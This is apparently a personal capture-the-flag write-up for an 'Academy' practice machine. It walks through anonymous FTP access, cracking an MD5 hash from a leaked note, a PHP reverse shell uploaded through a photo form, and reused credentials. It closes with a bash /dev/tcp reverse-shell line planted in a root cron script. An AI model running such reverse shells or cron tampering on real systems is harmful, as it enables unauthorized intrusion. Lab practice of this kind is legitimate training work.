was a bit more tricky that blue. here's the steps

1. scanned the box with [[Nmap]], found that [[FTP]], [[SSH]], and a web server was up
2. got an anonymous login and found a `note.txt` that read...
```text
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta
```
3. saw the `password` row with `cd73502828457d15655bbd7a63fb0bc8`, found out online it was an [[md5]] hash that was `student`
4. logged into the user code `10201321` with the password `student`
5. saw that there was an upload page for a photo, so i uploaded a [[reverse shell]] using [[PHP]] to get onto the box
6. once there, i ran [[linpeas.sh]] and saw that there was a user `grimmie` with the password `My_V3ryS3cur3_P4ss`. remembered that [[SSH]] was open so i logged into that user with that password and it worked
7. ran [[linpeas.sh]] again, but nothing special. noticed that there was a file called `backup.sh` in the user folder that would run every minute. This was run by the user `root`, so i changed the code to add the line `bash -i >& /dev/tcp/192.168.1.220/8080 0>&1` and used a [[Netcat]] listener to listen on port `8080` on my machine. This gave me a root shell.